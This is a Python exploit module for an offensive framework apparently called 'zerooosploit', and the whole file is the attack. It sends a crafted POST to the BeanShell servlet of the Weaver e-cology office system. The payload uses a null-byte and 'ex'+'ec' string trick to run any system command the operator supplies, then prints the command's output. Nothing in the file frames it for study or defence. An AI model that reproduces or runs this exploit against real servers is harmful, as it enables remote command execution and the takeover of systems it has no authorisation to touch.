from zerooosploit.exploits import ExploitAggregate
from zerooosploit.httpclient import HttpClient
from zerooosploit.printer import *


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'beanshell rce',
            'Module': 'exploits/ecology/beanshell_rce',
            'Product': 'ecology',
            'Cve': '',
            'Create_date': '2019-09-30',
            'Description': '',
            'Authors': '01sec',
            'References': ''
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:8080/', 'Required': 'yes', 'Description': 'The target url'},
            'command': {'Current Setting': 'whoami', 'Required': 'no', 'Description': 'Execute system commands'},
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0'}
        payload = '''bsh.script=eval%00("ex"%2b"ec(\"{0}\")");&bsh.servlet.captureOutErr=true&bsh.servlet.outp ut=raw'
'''.format(command)
        vul_url = url + '/weaver/bsh.servlet.BshServlet'
        print_blue('[*] {0}'.format(vul_url))
        res = HttpClient().send_request_cgi(method='POST', url=vul_url, headers=headers, data=payload)
        if res:
            if res.status_code == 200:
                print_green(res.text)
                print_green('[+] Exploit succeed')
            else:
                print_red('[-] {0} {1}'.format(vul_url, res.status_code))

        print_blue('[*] Exploit completed')
